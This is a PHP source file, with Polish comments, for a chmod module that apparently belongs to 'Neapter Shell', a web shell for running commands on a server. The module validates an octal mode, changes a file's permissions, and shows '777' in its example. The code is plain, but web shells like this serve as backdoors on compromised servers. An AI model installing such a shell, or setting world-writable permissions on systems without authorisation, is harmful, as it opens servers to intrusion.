<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleChmod extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('chmod');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.1.1 2016-06-09 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienia plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 2) {
            return self::getHelp();
        }

        $sChmod = (string) $this->oArgs->getParam(0);
        $sFile = $this->oArgs->getParam(1);

        if (!preg_match('~^[0-7]{3,4}\z~', $sChmod)) {
            return sprintf('Błędny chmod "%s"', $sChmod);
        }

        if (!file_exists($sFile)) {
            return sprintf('Plik "%s" nie istnieje', $sFile);
        }

        return sprintf(
            'Uprawnienia %szostały zmienione',
            (! @chmod($sFile, base_convert($sChmod, 8, 10)) ? 'nie ' : '')
        );
    }

}
